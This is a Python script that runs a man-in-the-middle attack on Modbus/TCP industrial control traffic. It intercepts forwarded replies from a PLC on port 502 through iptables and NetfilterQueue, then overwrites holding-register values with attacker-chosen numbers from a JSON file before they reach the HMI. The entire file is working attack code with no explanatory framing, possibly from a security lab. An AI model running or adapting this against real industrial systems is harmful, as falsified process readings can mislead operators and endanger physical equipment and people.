from scapy.all import *
import sys
from netfilterqueue import NetfilterQueue
import subprocess
import json

conf.iface = "eth1"

PLC_IP = sys.argv[1]
HMI_IP = sys.argv[2]

with open('reg_modify.json') as f:
    modify_reg_table = json.load(f)

def process_packet(pkt):
    try:
        z = IP(pkt.get_payload())
        if z.haslayer(Raw) and (z.sport == 502):
            raw_data = z[Raw].load
            if len(raw_data) >= 8:
                function_code = raw_data[7]
                if function_code == 3:
                    data_list = {
                        'transcation_id': int.from_bytes(raw_data[0:2], byteorder='big'),
                        'protocol_id': int.from_bytes(raw_data[2:4], byteorder='big'),
                        'length': int.from_bytes(raw_data[4:6], byteorder='big'),
                        'unit_id': raw_data[6],
                        'function_code': raw_data[7],
                        'byte_count': raw_data[8],
                        'data': raw_data[9::]
                    }
                    if 9 + data_list['byte_count'] > len(raw_data):
                        pkt.accept()
                        return

                    modify_raw_data = bytearray(raw_data)
                    for i in range(0, data_list['byte_count'], 2):
                        v = 9 + i
                        value = int.from_bytes(raw_data[v:v+2], byteorder='big')
                        key = str(i // 2)
                        modify_vlue = value
                        if key in modify_reg_table:
                            modify_vlue = modify_reg_table[key]
                            modify_raw_data[v:v+2] = modify_vlue.to_bytes(2, byteorder='big')
                    z[Raw].load = bytes(modify_raw_data)
                    del z[IP].len
                    del z[IP].chksum
                    del z[TCP].chksum
                    pkt.set_payload(bytes(z))
            pkt.accept()
        else:
            pkt.accept()
    except Exception as e:
        print(f"Error: {e}")
        pkt.accept()

subprocess.run(
    "echo 1 > /proc/sys/net/ipv4/ip_forward", 
    shell=True
)

QUEUE_NUM = 0
subprocess.run(
    f"iptables -I FORWARD -p tcp --sport 502 -j NFQUEUE --queue-num {QUEUE_NUM} ",
    shell=True
)

packet_queue = NetfilterQueue()
try:
    packet_queue.bind(QUEUE_NUM, process_packet)
    packet_queue.run()
except KeyboardInterrupt:
    pass
finally:
    subprocess.run(f"iptables -F", shell=True)
    packet_queue.unbind()
